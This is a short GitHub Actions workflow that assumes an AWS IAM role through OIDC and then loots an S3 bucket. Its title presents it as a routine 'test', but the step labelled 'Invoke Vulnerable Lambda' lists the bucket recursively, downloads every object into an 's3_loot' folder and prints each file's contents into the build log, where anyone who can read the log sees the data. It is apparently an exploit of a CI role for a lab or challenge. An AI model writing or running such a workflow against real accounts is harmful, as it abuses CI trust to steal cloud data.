name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Invoke Vulnerable Lambda
        run: |
          BUCKET="codec4f26c862a321ef5"
          
          echo "=== 1. RECURSIVELY LISTING ALL FILES IN THE BUCKET ==="
          aws s3 ls "s3://$BUCKET" --recursive
          
          echo ""
          echo "=== 2. DOWNLOADING EVERYTHING LOCALLY ==="
          mkdir -p s3_loot
          aws s3 sync "s3://$BUCKET" ./s3_loot/
          
          echo ""
          echo "=== 3. PRINTING CONTENTS OF ALL DOWNLOADED FILES ==="
          # This will automatically find every file in the loot folder and print its contents to the log
          find ./s3_loot -type f -exec echo "====================" \; \
                         -exec echo "FILE: {}" \; \
                         -exec echo "====================" \; \
                         -exec cat {} \; \
                         -exec echo "" \;
